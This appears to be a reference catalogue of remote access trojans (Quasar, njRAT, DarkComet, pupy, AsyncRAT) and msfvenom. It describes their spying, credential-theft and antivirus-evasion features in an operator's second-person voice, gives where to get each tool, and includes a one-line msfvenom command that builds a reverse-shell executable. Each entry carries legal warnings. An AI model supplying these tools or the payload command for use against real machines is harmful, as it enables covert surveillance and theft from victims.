Quasar RAT Once the victim runs the client executable (disguised as a legitimate program), Quasar establishes a persistent reverse connection to your C2 server. You gain full remote desktop viewing and control, file manager access, keylogger output, clipboard capture, webcam/microphone access, password extraction from browsers, and shell command execution — all through a clean Windows GUI dashboard. Full unauthorized remote control. Criminal under CFAA and Computer Misuse Act worldwide. git clone github.com/quasar/Quasar QuasarServer.exe # Windows C2 panel ❌ GitHub blocks — AV quarantines
njRAT Deploys a small stub on the victim machine that sends a reverse connection to your server. Provides real-time keylogging with window titles, screenshot capture every N seconds, microphone recording, access to all files on the victim's drives, ability to open/close the CD tray (classic "proof of infection" trick), and full remote shell execution with command history. Keylogging + remote access + data exfiltration. Used by APT groups. Federal crime to deploy. Underground sources only njrat.exe /port:5552 ❌ All AV quarantine on download
DarkComet One of the original feature-rich RATs. Records all keystrokes with window context, takes screenshots on demand or on schedule, accesses webcam and microphone silently, downloads and executes additional payloads, steals saved browser passwords, modifies the Windows registry for persistence, and communicates home via encrypted channel to evade basic network monitoring. Spyware with surveillance capabilities. Used in nation-state attacks. Illegal to possess in most countries. Underground sources only DarkComet-RAT.exe ❌ Illegal to possess — AV removes it
pupy Cross-platform Python RAT with a reflective DLL loader — runs entirely in memory without touching disk, bypassing most antivirus solutions. Supports Windows, macOS, and Linux targets. Provides interactive shell, file operations, screenshot, webcam, keylogger, network pivoting through the victim, and port forwarding. Can migrate between processes to maintain persistence. Memory-resident RAT designed to evade AV. Used in advanced attacks. Deploying = federal crime. git clone github.com/n1nj4sec/pupy pupysh.py -t ssl ❌ AV flags it — deploying = federal crime
AsyncRAT Open-source .NET-based RAT with encrypted C2 communications using SSL/TLS. Features real-time remote desktop, keylogger, clipboard monitor, file manager, process manager, registry editor, and a client builder that lets you configure the C2 IP, port, and a custom startup key. Also includes a built-in crypter to pack the client and reduce AV detection rates. Encrypted C2 with built-in evasion. Deploying on any system without consent = criminal offense. Underground sources only AsyncRAT.exe --port 6606 ❌ Blocked by AV/EDR — illegal to deploy
msfvenom (malicious payload) Generates standalone executable files, shellcode, or script-based payloads that, when run on a victim machine, connect back to a Metasploit listener. Once connected, you get a full Meterpreter shell: file system access, process injection, privilege escalation, credential harvesting via hashdump, pivot to other machines on the network, and persistent backdoor installation. Generates malware — deploying the output on any real system (not your own test lab) is a federal crime. Built into Metasploit msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe > shell.exe ⚠ Generates file — deploying = federal crime
